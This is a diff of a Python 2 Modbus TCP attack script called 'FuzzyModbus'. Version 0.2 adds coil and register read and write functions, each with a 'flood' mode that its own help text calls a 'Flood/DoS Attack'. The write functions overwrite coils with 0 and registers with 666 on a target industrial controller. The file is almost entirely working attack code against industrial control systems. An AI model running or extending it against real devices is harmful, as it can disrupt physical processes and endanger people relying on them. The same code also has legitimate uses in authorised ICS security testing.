@@ -7,10 +7,55 @@ import time
 from getopt import *
 from pyModbusTCP.client import *
 
+def readCoils(rq_type,client,bit_addr,bit_nb):
+
+    client.open()
+    print "!! Function Code 1 Read Coils executed !!"
+
+    if rq_type == "single":
+        rq = client.read_coils(int(bit_addr),int(bit_nb))
+        print rq
+        client.close()
+        exit(0)
+
+    elif rq_type == "flood":
+        while True:
+            rq = client.read_coils(int(bit_addr),int(bit_nb))
+            print rq
+        client.close()
+        exit(0)
+
+    else:
+        print "Wrong Request Type"
+        client.close()
+        exit(1)
+
+def readDiscreteInputs(rq_type,client,bit_addr,bit_nb):
+
+    client.open()
+    print "!! Function Code 2 Read Discrete Inputs executed !!"
+    if rq_type == "single":
+        rq = client.read_discrete_inputs(int(bit_addr),int(bit_nb))
+        print rq
+        client.close()
+        exit(0)
+
+    elif rq_type == "flood":
+        while True:
+            rq = client.read_discrete_inputs(int(bit_addr),int(bit_nb))
+            print rq
+        client.close()
+        exit(0)
+
+    else:
+        print "Wrong Request Type"
+        client.close()
+        exit(1)
+
 def readHoldingRegisters(rq_type,client,reg_addr,reg_nb):
 
     client.open()
-
+    print "!! Function Code 3 Read Holding Registers executed !!"
     if rq_type == "single":
         rq = client.read_holding_registers(int(reg_addr),int(reg_nb))
         print rq
@@ -23,6 +68,51 @@ def readHoldingRegisters(rq_type,client,reg_addr,reg_nb):
             print rq
         client.close()
         exit(0)
+
+    else:
+        print "Wrong Request Type"
+        client.close()
+        exit(1)
+
+def readInputRegisters(rq_type,client,reg_addr,reg_nb):
+
+    client.open()
+    print "!! Function Code 4 Read Input Registers executed !!"
+    if rq_type == "single":
+        rq = client.read_input_registers(int(reg_addr),int(reg_nb))
+        print rq
+        client.close()
+        exit(0)
+
+    elif rq_type == "flood":
+        while True:
+            rq = client.read_input_registers(int(reg_addr),int(reg_nb))
+            print rq
+        client.close()
+        exit(0)
+
+    else:
+        print "Wrong Request Type"
+        client.close()
+        exit(1)
+
+def writeSingleCoil(rq_type,client,bit_addr):
+
+    client.open()
+    print "!! Function Code 5 Write Single Coil executed !!"
+    if rq_type == "single":
+        rq = client.write_single_coil(int(bit_addr),0)
+        print rq
+        client.close()
+        exit(0)
+
+    elif rq_type == "flood":
+        while True:
+            rq = client.write_single_coil(int(bit_addr),0)
+            print rq
+        client.close()
+        exit(0)
+
     else:
         print "Wrong Request Type"
         client.close()
@@ -31,7 +121,7 @@ def readHoldingRegisters(rq_type,client,reg_addr,reg_nb):
 def writeSingleRegister(rq_type,client,reg_addr):
 
     client.open()
-
+    print "!! Function Code 6 Write Single Register executed !!"
     if rq_type == "single":
         rq = client.write_single_register(int(reg_addr),666)
         print rq
@@ -50,11 +140,34 @@ def writeSingleRegister(rq_type,client,reg_addr):
         client.close()
         exit(1)
 
+def writeMultipleCoils(rq_type,client,bit_addr,bit_nb):
+
+    client.open()
+    values = [0]*int(bit_nb)
+    print "!! Function Code 15 Write Multiple Coils executed !!"
+    if rq_type == "single":
+        rq = client.write_multiple_coils(int(bit_addr),values)
+        print rq
+        client.close()
+        exit(0)
+
+    elif rq_type == "flood":
+        while True:
+            rq = client.write_multiple_coils(int(bit_addr),values)
+            print rq
+        client.close()
+        exit(0)
+
+    else:
+        print "Wrong Request Type"
+        client.close()
+        exit(1)
+
 def writeMultipleRegisters(rq_type,client,reg_addr,reg_nb):
 
     client.open()
     values = [666]*int(reg_nb)
-
+    print "!! Function Code 16 Write Multiple Registers executed !!"
     if rq_type == "single":
         rq = client.write_multiple_registers(int(reg_addr),values)
         print rq
@@ -74,23 +187,31 @@ def writeMultipleRegisters(rq_type,client,reg_addr,reg_nb):
         exit(1)
 
 def usageExit():
-    print 'FuzzyModbus v0.1'
-    print 'Modbus TCP Register Fuzzing Tool by m3rt\n'
+    print 'FuzzyModbus v0.2'
+    print 'ModbusTCP Fuzzing Tool by m3rt\n'
     print '-h or --help\tHelp Menu'
-    print '-f or --func-code <Code>\tModbus Function Code (3=ReadHoldingRegisters, 6=WriteSingleRegister, 10=WriteMultipleRegisters)'
+    print '-f or --func-code <Code>\tModbus Function Code'
     print '-F or --flood\tOPTIONAL Modbus Flood/DoS Attack'
     print '-t or --target <IP_Addr>\tTarget Modbus Server IP Address'
     print '-p or --port <Port>\tDEFAULT=502 Target Modbus Server Port'
     print '-u or --uid <UID>\tDEFAULT=1 Unit ID'
     print '-a or --address <Reg_Addr>\tDEFAULT=0 First Register Address'
     print '-c or --count <Count>\tDEFAULT=1 Count of Registers to read/write'
+    print '\nSupported Function Codes:'
+    print '\tRead Coils\t\t\tFunc. Code = 1'
+    print '\tRead Discrete Inputs\t\tFunc. Code = 2'
+    print '\tRead Holding Registes\t\tFunc. Code = 3'
+    print '\tRead Input Registers\t\tFunc. Code = 4'
+    print '\tWrite Single Coil\t\tFunc. Code = 5'
+    print '\tWrite Single Register\t\tFunc. Code = 6'
+    print '\tWrite Multiple Coils\t\tFunc. Code = 15'
+    print '\tWrite Multiple Registers\tFunc. Code = 16'
     sys.exit(1)
 
 def main():
 
     try:
         opts, args = getopt(sys.argv[1:], 'hf:Ft:p:u:a:c:', ['help','func-code=','target=','port=','uid=','address=','count='])
-
     except GetoptError:
         usageExit()
 
@@ -108,18 +229,17 @@ def main():
         if opt in ('-u','--uid'):
             uid = arg
         if opt in ('-a','--address'):
-            reg_addr = arg
+            bit_addr=reg_addr = arg
         if opt in ('-c','--count'):
-            reg_nb = arg
-
-    if not opts:
-        print "May the arguments with you!\n"
-        usageExit()
+            bit_nb=reg_nb = arg
+        if not opts:
+            print "May the arguments with you!\n"
+            usageExit()
 
     try:
         func
     except:
-        func = '3'
+        func = '1'
     try:
         rq_type
     except:
@@ -138,39 +258,34 @@ def main():
     except:
         uid = "1"
     try:
-        reg_addr
+        bit_addr
     except:
-        reg_addr = "0"
+        bit_addr=reg_addr = "0"
     try:
-        reg_ng
+        bit_nb
     except:
-        reg_nb = "1"
-
-
-    #    func = sys.argv[1]
-    #    rq_type = sys.argv[2]
-    #    ip_addr = sys.argv[3]
-    #    port = sys.argv[4]
-    #    uid = sys.argv[5]
-    #    reg_addr = sys.argv[6]
-    #    try:
-    #        reg_nb = sys.argv[7]
-    #    except:
-    #        reg_nb = 1
+        bit_nb=reg_nb = "1"
 
     client = ModbusClient(ip_addr,int(port),int(uid),auto_open=None)
 
-    if func == "3":
+    if func == "1":
+        readCoils(rq_type,client,bit_addr,bit_nb)
+    elif func == "2":
+        readDiscreteInputs(rq_type,client,bit_addr,bit_nb)
+    elif func == "3":
         readHoldingRegisters(rq_type,client,reg_addr,reg_nb)
-
+    elif func == "4":
+        readInputRegisters(rq_type,client,reg_addr,reg_nb)
+    elif func == "5":
+        writeSingleCoil(rq_type,client,bit_addr)
     elif func == "6":
         writeSingleRegister(rq_type,client,reg_addr)
-
-    elif func == "10":
+    elif func == "15":
+        writeMultipleCoils(rq_type,client,bit_addr,bit_nb)
+    elif func == "16":
         writeMultipleRegisters(rq_type,client,reg_addr,reg_nb)
-
     else:
-        print "Wrong Function Code. Supported Func. Codes: 3, 6, 10"
+        print "Wrong Function Code. Supported Func. Codes: 1, 2, 3, 4, 5, 6, 15, 16"
         usageExit()
 
 if __name__ == '__main__':
